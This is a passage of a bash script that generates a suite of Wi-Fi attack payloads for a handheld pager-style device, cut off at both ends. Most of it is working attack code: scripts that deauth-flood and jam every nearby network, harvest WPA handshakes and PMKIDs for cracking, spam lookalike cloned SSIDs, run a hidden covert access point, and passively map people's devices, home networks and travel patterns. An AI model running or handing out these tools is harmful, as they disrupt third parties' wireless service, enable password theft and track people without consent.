case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=120 ;; esac

resp=$(CONFIRMATION_DIALOG "UNLEASH POLTERGEIST?

Duration: ${DURATION}s
Interface: $MON_IF

Random attacks will target
nearby WiFi networks.

Press OK to begin chaos.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Poltergeist unleashed..."

# Quick scan
SPINNER_START "Scanning targets..."
rm -f /tmp/poltergeist*
timeout 15 airodump-ng "$MON_IF" -w /tmp/poltergeist --output-format csv 2>/dev/null &
sleep 15
killall airodump-ng 2>/dev/null
SPINNER_STOP

# Build target list
grep -E "^[0-9A-Fa-f]{2}:" /tmp/poltergeist-01.csv 2>/dev/null | \
    awk -F',' '{print $1","$4","$14}' | head -20 > /tmp/polt_targets.txt

TARGET_COUNT=$(wc -l < /tmp/polt_targets.txt 2>/dev/null || echo 0)
LOG "Found $TARGET_COUNT targets"

LOG_FILE="$LOOT_DIR/chaos_$(date +%Y%m%d_%H%M).log"
END_TIME=$(($(date +%s) + DURATION))
ATTACK_COUNT=0

while [ $(date +%s) -lt $END_TIME ]; do
    ATTACK_TYPE=$((RANDOM % 3))
    TARGET_LINE=$(shuf -n1 /tmp/polt_targets.txt 2>/dev/null)
    BSSID=$(echo "$TARGET_LINE" | cut -d',' -f1 | tr -d ' ')
    CH=$(echo "$TARGET_LINE" | cut -d',' -f2 | tr -d ' ')
    [ -z "$BSSID" ] && continue
    [ -z "$CH" ] && CH=$((RANDOM % 11 + 1))

    iwconfig "$MON_IF" channel $CH 2>/dev/null

    case $ATTACK_TYPE in
        0) aireplay-ng -0 $((RANDOM % 15 + 3)) -a "$BSSID" "$MON_IF" 2>/dev/null & sleep 3 ;;
        1) aireplay-ng -0 5 -a FF:FF:FF:FF:FF:FF "$MON_IF" 2>/dev/null & sleep 2 ;;
        2) for c in 1 6 11; do iwconfig "$MON_IF" channel $c 2>/dev/null; aireplay-ng -0 3 -a FF:FF:FF:FF:FF:FF "$MON_IF" 2>/dev/null & sleep 1; done ;;
    esac

    ATTACK_COUNT=$((ATTACK_COUNT + 1))
    killall aireplay-ng 2>/dev/null
    sleep $((RANDOM % 3 + 1))
done

killall aireplay-ng 2>/dev/null
rm -f /tmp/poltergeist* /tmp/polt_targets.txt 2>/dev/null

PROMPT "POLTERGEIST COMPLETE

Attacks launched: $ATTACK_COUNT
Duration: ${DURATION}s
Log: $LOG_FILE

Press OK to exit."
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 10. Reaper - Was CLI echo/read, now Pager API
##############################################################################
cat > "$SUITE_DIR/Reaper/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: Reaper - Hash Harvester
# Author: NullSec
# Description: Automated WPA handshake and PMKID capture
# Category: nullsec/capture

LOOT_DIR="/mmc/nullsec/reaper"
mkdir -p "$LOOT_DIR"

PROMPT "REAPER - HASH HARVESTER

Automated capture of WPA
handshakes and PMKIDs.

Modes:
1. PMKID only (clientless)
2. Handshake (with deauth)
3. Full harvest (both)

Press OK to configure."

MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!"; exit 1; }

PROMPT "HARVEST MODE:

1. PMKID only (fast)
2. Handshake capture
3. Full harvest (both)

Select mode next."

MODE=$(NUMBER_PICKER "Mode (1-3):" 3)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MODE=3 ;; esac

DURATION_PER=$(NUMBER_PICKER "Seconds per target:" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION_PER=30 ;; esac

resp=$(CONFIRMATION_DIALOG "START HARVESTING?

Mode: $MODE
Per-target: ${DURATION_PER}s
Interface: $MON_IF

Will scan and attack all
WPA networks found.

Press OK to harvest.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

TIMESTAMP=$(date +%Y%m%d_%H%M)
RESULTS_DIR="$LOOT_DIR/harvest_$TIMESTAMP"
mkdir -p "$RESULTS_DIR"

LOG "Scanning for WPA targets..."
SPINNER_START "Scanning for WPA networks..."
rm -f /tmp/reaper*
timeout 15 airodump-ng "$MON_IF" -w /tmp/reaper --output-format csv 2>/dev/null &
sleep 15
killall airodump-ng 2>/dev/null
SPINNER_STOP

grep -E "^[0-9A-Fa-f]{2}:" /tmp/reaper-01.csv 2>/dev/null | grep -iE "WPA" | head -10 > /tmp/reaper_targets.txt
TARGET_COUNT=$(wc -l < /tmp/reaper_targets.txt 2>/dev/null || echo 0)

[ "$TARGET_COUNT" -eq 0 ] && { ERROR_DIALOG "No WPA networks found!"; exit 1; }

LOG "Found $TARGET_COUNT WPA targets"
HANDSHAKE_COUNT=0
PMKID_COUNT=0

while IFS=',' read -r bssid x1 x2 channel x3 x4 x5 x6 x7 x8 x9 x10 x11 essid rest; do
    bssid=$(echo "$bssid" | tr -d ' ')
    channel=$(echo "$channel" | tr -d ' ')
    essid=$(echo "$essid" | sed 's/^[[:space:]]*//' | tr -cd '[:alnum:]_-')
    [ -z "$bssid" ] || [ -z "$channel" ] && continue
    [ -z "$essid" ] && essid="unknown"

    LOG "Target: $essid ($bssid CH:$channel)"
    iwconfig "$MON_IF" channel "$channel" 2>/dev/null

    # Handshake capture
    if [ "$MODE" = "2" ] || [ "$MODE" = "3" ]; then
        CAP_FILE="$RESULTS_DIR/${essid}_hs"
        airodump-ng -c "$channel" --bssid "$bssid" -w "$CAP_FILE" "$MON_IF" 2>/dev/null &
        DUMP_PID=$!
        sleep 5
        aireplay-ng -0 5 -a "$bssid" "$MON_IF" 2>/dev/null
        sleep 10
        aireplay-ng -0 5 -a "$bssid" "$MON_IF" 2>/dev/null
        sleep $((DURATION_PER - 15))
        kill $DUMP_PID 2>/dev/null
        killall aireplay-ng 2>/dev/null
        if [ -f "${CAP_FILE}-01.cap" ] && aircrack-ng "${CAP_FILE}-01.cap" 2>&1 | grep -q "1 handshake"; then
            HANDSHAKE_COUNT=$((HANDSHAKE_COUNT + 1))
            LOG "Handshake captured for $essid!"
        fi
    fi
done < /tmp/reaper_targets.txt

# Combine hashes
cat "$RESULTS_DIR"/*.22000 2>/dev/null | sort -u > "$RESULTS_DIR/all_hashes.22000"
TOTAL_HASHES=$(wc -l < "$RESULTS_DIR/all_hashes.22000" 2>/dev/null || echo 0)

killall airodump-ng aireplay-ng hcxdumptool 2>/dev/null
rm -f /tmp/reaper* 2>/dev/null

PROMPT "REAPER HARVEST COMPLETE

Targets attacked: $TARGET_COUNT
Handshakes: $HANDSHAKE_COUNT
PMKIDs: $PMKID_COUNT
Total hashes: $TOTAL_HASHES

Results: $RESULTS_DIR/

Press OK to exit."
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 11. SSIDPranks - Fixed $RANDOM, now Pager API
##############################################################################
cat > "$SUITE_DIR/SSIDPranks/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: SSID Pranks
# Author: NullSec
# Description: Broadcast funny WiFi names
# Category: nullsec/prank

LOOT_DIR="/mmc/nullsec/pranks"
mkdir -p "$LOOT_DIR"

PROMPT "SSID PRANKS

Broadcast funny or scary
WiFi network names that
show up on nearby devices.

Uses hostapd to create
real visible networks.

Press OK to configure."

PROMPT "PRANK CATEGORY:

1. Funny Names
2. Scary/Warning
3. Trolling Names
4. Tech Humor
5. Custom Message

Select on next screen."

CHOICE=$(NUMBER_PICKER "Category (1-5):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) CHOICE=1 ;; esac

SSID_FILE="/tmp/prank_ssids.txt"
case $CHOICE in
    1) printf "Pretty_Fly_For_A_WiFi\nWu_Tang_LAN\nBill_Wi_The_Science_Fi\nDrop_It_Like_Its_Hotspot\nLAN_Solo\nThe_Promised_LAN\nGetOffMyLAN\nIt_Hurts_When_IP\nLoading...\nError_404_WiFi_Not_Found" > "$SSID_FILE" ;;
    2) printf "FBI_Surveillance_Van_7\nNSA_Field_Unit\nPolice_Stakeout\nVIRUS_INFECTED\nYOUR_FILES_ENCRYPTED\nSYSTEM_COMPROMISED\nMALWARE_DETECTED\nDO_NOT_CONNECT\nQUARANTINE_ZONE" > "$SSID_FILE" ;;
    3) printf "Loading...\nSearching...\nConnecting...\nNo_Internet_Connection\nError_404_WiFi_Not_Found\nPlease_Wait...\nNetwork_Not_Found\nAccess_Denied\nHack_Me_If_You_Can" > "$SSID_FILE" ;;
    4) printf "127.0.0.1\nlocalhost\n/dev/null\nrm_-rf_slash\nDROP_TABLE_wifi\nSELECT_*_FROM_users\nBuffer_Overflow\nKernel_Panic\nSEGFAULT" > "$SSID_FILE" ;;
    5) CUSTOM=$(TEXT_PICKER "Enter SSID:" "NullSec_Was_Here")
       echo "$CUSTOM" > "$SSID_FILE" ;;
esac

DURATION=$(NUMBER_PICKER "Duration (seconds):" 60)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac

resp=$(CONFIRMATION_DIALOG "START SSID PRANKS?

Category: $CHOICE
Duration: ${DURATION}s

SSIDs will be visible
on all nearby devices.

Press OK to prank.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Starting SSID pranks..."
LOG_FILE="$LOOT_DIR/prank_$(date +%Y%m%d_%H%M).log"

# Use mdk4/mdk3 for proper beacon spam
if command -v mdk4 >/dev/null 2>&1; then
    timeout "$DURATION" mdk4 wlan1mon b -f "$SSID_FILE" -s 50 2>&1 | tee "$LOG_FILE" &
    wait $!
elif command -v mdk3 >/dev/null 2>&1; then
    timeout "$DURATION" mdk3 wlan1mon b -f "$SSID_FILE" -s 50 2>&1 | tee "$LOG_FILE" &
    wait $!
else
    # Fallback: hostapd rotation
    END_TIME=$(($(date +%s) + DURATION))
    COUNT=0
    while [ $(date +%s) -lt $END_TIME ]; do
        while read SSID; do
            [ -z "$SSID" ] && continue
            [ $(date +%s) -ge $END_TIME ] && break
            CH=$((RANDOM % 11 + 1))
            cat > /tmp/prank_ap.conf << APEOF
interface=wlan1
ssid=$SSID
channel=$CH
hw_mode=g
auth_algs=1
wpa=0
APEOF
            timeout 4 hostapd /tmp/prank_ap.conf 2>/dev/null &
            sleep 4
            killall hostapd 2>/dev/null
            COUNT=$((COUNT + 1))
            echo "$(date +%H:%M:%S) $SSID CH:$CH" >> "$LOG_FILE"
        done < "$SSID_FILE"
    done
fi

killall mdk4 mdk3 hostapd 2>/dev/null
rm -f "$SSID_FILE" /tmp/prank_ap.conf

PROMPT "PRANK COMPLETE

Duration: ${DURATION}s
Log: $LOG_FILE

Press OK to exit."
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 12. WiFiConfuser - Fixed mode switching, now Pager API
##############################################################################
cat > "$SUITE_DIR/WiFiConfuser/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: WiFi Confuser
# Author: NullSec
# Description: Create confusion with fake networks + deauths
# Category: nullsec/chaos

LOOT_DIR="/mmc/nullsec/confuser"
mkdir -p "$LOOT_DIR"

PROMPT "WIFI CONFUSER

Create network confusion by
cloning nearby SSIDs with
variations and deauthing.

Scans real networks, then
creates lookalike clones.

Press OK to configure."

MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!"; exit 1; }

DURATION=$(NUMBER_PICKER "Duration (seconds):" 60)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac

resp=$(CONFIRMATION_DIALOG "START WIFI CONFUSER?

Duration: ${DURATION}s
Interface: $MON_IF

Will clone nearby SSIDs
and add confusing variants.

Press OK to confuse.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Starting confusion..."

SPINNER_START "Scanning for networks to clone..."
rm -f /tmp/confuser*
timeout 10 airodump-ng "$MON_IF" -w /tmp/confuser --output-format csv 2>/dev/null &
sleep 10
killall airodump-ng 2>/dev/null
SPINNER_STOP

# Extract real SSIDs
grep -E "^[0-9A-Fa-f]{2}:" /tmp/confuser-01.csv 2>/dev/null | \
    awk -F',' '{gsub(/^ +| +$/,"",$14); if($14!="") print $14}' | \
    sort -u | head -10 > /tmp/real_ssids.txt

SSID_COUNT=$(wc -l < /tmp/real_ssids.txt 2>/dev/null || echo 0)
[ "$SSID_COUNT" -eq 0 ] && echo "FreeWiFi" > /tmp/real_ssids.txt

LOG "Cloning $SSID_COUNT networks..."
LOG_FILE="$LOOT_DIR/confuse_$(date +%Y%m%d_%H%M).log"

# Generate confusing SSID variations
> /tmp/confuse_ssids.txt
while read SSID; do
    [ -z "$SSID" ] && continue
    echo "${SSID}_Guest" >> /tmp/confuse_ssids.txt
    echo "${SSID}_5G" >> /tmp/confuse_ssids.txt
    echo "${SSID}_Secure" >> /tmp/confuse_ssids.txt
    echo "${SSID}_Free" >> /tmp/confuse_ssids.txt
    echo "${SSID} 2" >> /tmp/confuse_ssids.txt
done < /tmp/real_ssids.txt

# Use mdk4 for beacon spam (much more effective than mode switching)
if command -v mdk4 >/dev/null 2>&1; then
    timeout "$DURATION" mdk4 "$MON_IF" b -f /tmp/confuse_ssids.txt -s 50 2>&1 | tee "$LOG_FILE" &
    wait $!
else
    # Fallback: deauth + channel hop
    END_TIME=$(($(date +%s) + DURATION))
    while [ $(date +%s) -lt $END_TIME ]; do
        for CH in 1 6 11; do
            [ $(date +%s) -ge $END_TIME ] && break
            iwconfig "$MON_IF" channel $CH 2>/dev/null
            aireplay-ng -0 5 -a FF:FF:FF:FF:FF:FF "$MON_IF" 2>/dev/null &
            echo "$(date +%H:%M:%S) DEAUTH CH:$CH" >> "$LOG_FILE"
            sleep 3
            killall aireplay-ng 2>/dev/null
        done
    done
fi

killall mdk4 mdk3 aireplay-ng 2>/dev/null
rm -f /tmp/confuser* /tmp/real_ssids.txt /tmp/confuse_ssids.txt

PROMPT "CONFUSION COMPLETE

Duration: ${DURATION}s
Log: $LOG_FILE

Press OK to exit."
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 13. WifiJammer - Was CLI echo/read, now Pager API
##############################################################################
cat > "$SUITE_DIR/WifiJammer/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: WiFi Jammer
# Author: NullSec
# Description: Continuous WiFi disruption via deauth
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/jammer"
mkdir -p "$LOOT_DIR"

PROMPT "WIFI JAMMER

Continuous deauthentication
to disrupt WiFi service.

Modes:
1. Specific network
2. All on channel
3. Channel-hop all 2.4GHz

Press OK to configure."

MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!"; exit 1; }

PROMPT "JAMMING MODE:

1. Jam specific network
2. Jam one channel
3. Hop all 2.4GHz channels

Select mode next."

MODE=$(NUMBER_PICKER "Mode (1-3):" 3)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MODE=3 ;; esac

TARGET_BSSID="FF:FF:FF:FF:FF:FF"
TARGET_CH="1"

if [ "$MODE" -eq 1 ]; then
    SPINNER_START "Scanning targets..."
    rm -f /tmp/jamtarget*
    timeout 10 airodump-ng "$MON_IF" -w /tmp/jamtarget --output-format csv 2>/dev/null &
    sleep 10
    killall airodump-ng 2>/dev/null
    SPINNER_STOP

    NET_COUNT=0
    NETS=""
    if [ -f /tmp/jamtarget-01.csv ]; then
        while IFS=',' read -r bssid x1 x2 channel x3 x4 x5 x6 power x7 x8 x9 x10 essid rest; do
            bssid=$(echo "$bssid" | tr -d ' ')
            [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
            essid=$(echo "$essid" | sed 's/^[[:space:]]*//' | head -c 18)
            [ -z "$essid" ] && essid="[Hidden]"
            NET_COUNT=$((NET_COUNT + 1))
            NETS="${NETS}${NET_COUNT}. ${essid}\n"
            eval "BSSID_${NET_COUNT}=\"$bssid\""
            eval "CH_${NET_COUNT}=$(echo $channel | tr -d ' ')"
            [ $NET_COUNT -ge 10 ] && break
        done < /tmp/jamtarget-01.csv
    fi

    [ $NET_COUNT -gt 0 ] && {
        PROMPT "TARGETS: $NET_COUNT\n\n$(echo -e "$NETS")"
        SEL=$(NUMBER_PICKER "Target (1-$NET_COUNT):" 1)
        eval "TARGET_BSSID=\"\$BSSID_${SEL}\""
        eval "TARGET_CH=\"\$CH_${SEL}\""
    }
    rm -f /tmp/jamtarget*
elif [ "$MODE" -eq 2 ]; then
    TARGET_CH=$(NUMBER_PICKER "Channel (1-11):" 6)
fi

DURATION=$(NUMBER_PICKER "Duration (seconds):" 60)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac

resp=$(CONFIRMATION_DIALOG "START JAMMING?

Mode: $MODE
Duration: ${DURATION}s

Press OK to jam.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Jamming started..."
LOG_FILE="$LOOT_DIR/jam_$(date +%Y%m%d_%H%M).log"

case $MODE in
    1)
        iwconfig "$MON_IF" channel "$TARGET_CH" 2>/dev/null
        timeout "$DURATION" aireplay-ng -0 0 -a "$TARGET_BSSID" "$MON_IF" 2>&1 | tee "$LOG_FILE" &
        wait $!
        ;;
    2)
        iwconfig "$MON_IF" channel "$TARGET_CH" 2>/dev/null
        timeout "$DURATION" aireplay-ng -0 0 -a FF:FF:FF:FF:FF:FF "$MON_IF" 2>&1 | tee "$LOG_FILE" &
        wait $!
        ;;
    3)
        END_TIME=$(($(date +%s) + DURATION))
        while [ $(date +%s) -lt $END_TIME ]; do
            for CH in 1 2 3 4 5 6 7 8 9 10 11; do
                [ $(date +%s) -ge $END_TIME ] && break
                iwconfig "$MON_IF" channel $CH 2>/dev/null
                aireplay-ng -0 10 -a FF:FF:FF:FF:FF:FF "$MON_IF" 2>/dev/null &
                echo "$(date +%H:%M:%S) CH:$CH" >> "$LOG_FILE"
                sleep 2
                killall aireplay-ng 2>/dev/null
            done
        done
        ;;
esac

killall aireplay-ng 2>/dev/null

PROMPT "JAMMING COMPLETE

Duration: ${DURATION}s
Log: $LOG_FILE

Press OK to exit."
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 14. GhostNetwork - Was headless, now Pager API with user input
##############################################################################
cat > "$SUITE_DIR/GhostNetwork/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: Ghost Network
# Author: NullSec
# Description: Create hidden covert network for stealth ops
# Category: nullsec/stealth

LOOT_DIR="/mmc/nullsec/ghost"
mkdir -p "$LOOT_DIR"

PROMPT "GHOST NETWORK

Create an invisible hidden
WiFi network for covert
operations.

Network will not appear
in normal WiFi scans.

Press OK to configure."

GHOST_CH=$(NUMBER_PICKER "Channel (1-11):" 6)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) GHOST_CH=6 ;; esac

DURATION=$(NUMBER_PICKER "Duration (minutes):" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=30 ;; esac
DURATION_SEC=$((DURATION * 60))

resp=$(CONFIRMATION_DIALOG "DEPLOY GHOST NETWORK?

Channel: $GHOST_CH
Duration: ${DURATION} min
SSID: (hidden)

Clients need SSID to connect.

Press OK to deploy.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

GHOST_IF="wlan1"
# Stop monitor mode to use AP mode
airmon-ng stop wlan1mon 2>/dev/null
sleep 1

LOG_FILE="$LOOT_DIR/ghost_$(date +%Y%m%d_%H%M).log"

cat > /tmp/ghost_hostapd.conf << EOF
interface=$GHOST_IF
driver=nl80211
ssid=nullsec_ghost
channel=$GHOST_CH
hw_mode=g
ieee80211n=1
ignore_broadcast_ssid=2
beacon_int=1000
auth_algs=1
wpa=2
wpa_passphrase=nullsec_ghost_key
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

ifconfig "$GHOST_IF" up 2>/dev/null
hostapd /tmp/ghost_hostapd.conf -B 2>/dev/null
sleep 2
ifconfig "$GHOST_IF" 10.66.66.1 netmask 255.255.255.0

LOG "Ghost network active on CH:$GHOST_CH"

# Run for duration
sleep "$DURATION_SEC"

killall hostapd 2>/dev/null
airmon-ng start wlan1 2>/dev/null

PROMPT "GHOST NETWORK STOPPED

Channel: $GHOST_CH
Duration: ${DURATION} min
Log: $LOG_FILE

Press OK to exit."
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 15. Honeypot - Was headless, now Pager API
##############################################################################
cat > "$SUITE_DIR/Honeypot/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: Honeypot
# Author: NullSec
# Description: Decoy AP that logs all connection attempts
# Category: nullsec/defense

LOOT_DIR="/mmc/nullsec/honeypot"
mkdir -p "$LOOT_DIR"

PROMPT "HONEYPOT AP

Deploy a decoy access point
with weak credentials to
detect and log attackers.

Monitors:
- Connection attempts
- Authentication tries
- Client behavior

Press OK to configure."

SSID=$(TEXT_PICKER "Honeypot SSID:" "Free_WiFi_Secure")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) SSID="Free_WiFi_Secure" ;; esac

HP_PASS=$(TEXT_PICKER "Weak password:" "password123")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) HP_PASS="password123" ;; esac

DURATION=$(NUMBER_PICKER "Duration (minutes):" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=30 ;; esac
DURATION_SEC=$((DURATION * 60))

resp=$(CONFIRMATION_DIALOG "DEPLOY HONEYPOT?

SSID: $SSID
Password: $HP_PASS
Duration: ${DURATION} min

All activity will be logged.

Press OK to deploy.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

HP_IF="wlan1"
airmon-ng stop wlan1mon 2>/dev/null
sleep 1

LOG_FILE="$LOOT_DIR/honeypot_$(date +%Y%m%d_%H%M).log"
ALERT_FILE="$LOOT_DIR/alerts_$(date +%Y%m%d_%H%M).txt"

cat > /tmp/hp_hostapd.conf << EOF
interface=$HP_IF
driver=nl80211
ssid=$SSID
channel=6
hw_mode=g
auth_algs=1
wpa=2
wpa_passphrase=$HP_PASS
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
logger_stdout=-1
logger_stdout_level=2
EOF

ifconfig "$HP_IF" up
hostapd /tmp/hp_hostapd.conf > /tmp/hp_log.txt 2>&1 &
HP_PID=$!
sleep 2

ifconfig "$HP_IF" 192.168.99.1 netmask 255.255.255.0 2>/dev/null

# Capture traffic
tcpdump -i "$HP_IF" -w "$LOOT_DIR/hp_capture_$(date +%Y%m%d_%H%M).pcap" 2>/dev/null &
TCP_PID=$!

LOG "Honeypot deployed: $SSID"

# Monitor for the duration
END=$(($(date +%s) + DURATION_SEC))
while [ $(date +%s) -lt $END ]; do
    # Check for new associations
    if [ -f /tmp/hp_log.txt ]; then
        grep -i "associated\|authenticated\|deauth" /tmp/hp_log.txt 2>/dev/null | tail -5 >> "$ALERT_FILE"
        > /tmp/hp_log.txt
    fi
    CLIENTS=$(iw dev "$HP_IF" station dump 2>/dev/null | grep -c "Station")
    [ "$CLIENTS" -gt 0 ] && echo "$(date) Active clients: $CLIENTS" >> "$LOG_FILE"
    sleep 10
done

kill $HP_PID $TCP_PID 2>/dev/null
killall hostapd tcpdump 2>/dev/null
airmon-ng start wlan1 2>/dev/null

ALERT_COUNT=$(wc -l < "$ALERT_FILE" 2>/dev/null || echo 0)

PROMPT "HONEYPOT STOPPED

SSID: $SSID
Duration: ${DURATION} min
Alerts: $ALERT_COUNT
Log: $LOG_FILE

Press OK to exit."
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 16. NetworkMapper - Was headless, now Pager API
##############################################################################
cat > "$SUITE_DIR/NetworkMapper/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: Network Mapper
# Author: NullSec
# Description: Scan and map all nearby networks
# Category: nullsec/recon

LOOT_DIR="/mmc/nullsec/networkmap"
mkdir -p "$LOOT_DIR"

PROMPT "NETWORK MAPPER

Scan and catalog all
nearby WiFi networks.

Records:
- SSIDs and BSSIDs
- Channels and encryption
- Signal strength
- Connected clients

Press OK to configure."

MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!"; exit 1; }

DURATION=$(NUMBER_PICKER "Scan duration (sec):" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=30 ;; esac

resp=$(CONFIRMATION_DIALOG "START NETWORK MAP?

Interface: $MON_IF
Duration: ${DURATION}s

Press OK to scan.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Mapping networks..."
SPINNER_START "Scanning all channels..."

rm -f /tmp/netmap*
timeout "$DURATION" airodump-ng "$MON_IF" --output-format csv -w /tmp/netmap 2>/dev/null &
sleep "$DURATION"
killall airodump-ng 2>/dev/null

SPINNER_STOP

LOG_FILE="$LOOT_DIR/map_$(date +%Y%m%d_%H%M).txt"
NET_COUNT=0

if [ -f /tmp/netmap-01.csv ]; then
    echo "=== NETWORK MAP - $(date) ===" > "$LOG_FILE"
    echo "" >> "$LOG_FILE"
    while IFS=',' read -r bssid x1 x2 channel x3 privacy x5 x6 power x7 x8 x9 x10 essid rest; do
        bssid=$(echo "$bssid" | tr -d ' ')
        [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
        essid=$(echo "$essid" | sed 's/^[[:space:]]*//')
        channel=$(echo "$channel" | tr -d ' ')
        privacy=$(echo "$privacy" | tr -d ' ')
        power=$(echo "$power" | tr -d ' ')
        NET_COUNT=$((NET_COUNT + 1))
        printf "%-18s CH:%-3s %-10s %sdBm %s\n" "$bssid" "$channel" "$privacy" "$power" "$essid" >> "$LOG_FILE"
    done < /tmp/netmap-01.csv
fi

rm -f /tmp/netmap* 2>/dev/null

PROMPT "NETWORK MAP COMPLETE

Networks found: $NET_COUNT
Map file: $LOG_FILE

Press OK to exit."
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 17. SocialMapper - Was headless, now Pager API
##############################################################################
cat > "$SUITE_DIR/SocialMapper/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: Social Mapper
# Author: NullSec
# Description: Map device relationships and network patterns
# Category: nullsec/recon

LOOT_DIR="/mmc/nullsec/socialmap"
mkdir -p "$LOOT_DIR"

PROMPT "SOCIAL MAPPER

Map device relationships by
analyzing probe requests
and network associations.

Reveals:
- Device home networks
- Travel patterns
- Social groupings

Press OK to configure."

MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!"; exit 1; }

DURATION=$(NUMBER_PICKER "Scan duration (sec):" 60)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac

resp=$(CONFIRMATION_DIALOG "START SOCIAL MAPPING?

Interface: $MON_IF
Duration: ${DURATION}s

Passive monitoring only.
No packets transmitted.

Press OK to scan.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Social mapping started..."
SPINNER_START "Observing network relationships..."

rm -f /tmp/socialmap*
timeout "$DURATION" airodump-ng "$MON_IF" --write /tmp/socialmap --output-format csv --write-interval 5 2>/dev/null &
sleep "$DURATION"
killall airodump-ng 2>/dev/null

SPINNER_STOP

MAP_FILE="$LOOT_DIR/social_$(date +%Y%m%d_%H%M).txt"
echo "=== SOCIAL NETWORK MAP - $(date) ===" > "$MAP_FILE"

AP_COUNT=0
CLIENT_COUNT=0

if [ -f /tmp/socialmap-01.csv ]; then
    echo "" >> "$MAP_FILE"
    echo "=== ACCESS POINTS ===" >> "$MAP_FILE"
    while IFS=',' read -r bssid x1 x2 channel x3 privacy x5 x6 power x7 x8 x9 x10 essid rest; do
        bssid=$(echo "$bssid" | tr -d ' ')
        [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
        [[ "$bssid" == *"Station"* ]] && break
        essid=$(echo "$essid" | sed 's/^[[:space:]]*//')
        AP_COUNT=$((AP_COUNT + 1))
        echo "  $essid ($bssid) CH:$(echo $channel | tr -d ' ')" >> "$MAP_FILE"
    done < /tmp/socialmap-01.csv

    echo "" >> "$MAP_FILE"
    echo "=== CLIENT DEVICES ===" >> "$MAP_FILE"
    IN_CLIENTS=0
    while IFS=',' read -r mac x1 x2 power packets bssid probes rest; do
        mac=$(echo "$mac" | tr -d ' ')
        [[ "$mac" == *"Station"* ]] && IN_CLIENTS=1 && continue
        [ $IN_CLIENTS -eq 0 ] && continue
        [[ ! "$mac" =~ ^[0-9A-Fa-f]{2}: ]] && continue
        probes=$(echo "$probes" | sed 's/^[[:space:]]*//')
        bssid=$(echo "$bssid" | tr -d ' ')
        CLIENT_COUNT=$((CLIENT_COUNT + 1))
